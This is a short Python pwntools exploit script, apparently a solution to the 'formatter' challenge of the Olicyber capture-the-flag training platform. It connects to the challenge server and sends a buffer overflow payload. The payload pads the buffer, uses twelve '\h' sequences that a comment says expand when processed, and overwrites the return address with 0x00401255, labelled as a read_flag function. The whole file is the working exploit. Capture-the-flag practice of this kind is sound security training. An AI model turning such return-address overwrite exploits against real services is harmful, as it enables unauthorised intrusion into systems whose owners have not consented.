from pwn import *

r = remote("formatter.challs.olicyber.it", 20006)

payload =  b"a"   * 24
payload += b"\\h" * 12          # "\h" non esiste e diventa "?\h?"
payload += b"b"   * 8
print(len(payload))

payload += p64(0x00401255)      # indirizzo funzione read_flag

r.recv(1000)
r.sendline(payload)
r.interactive()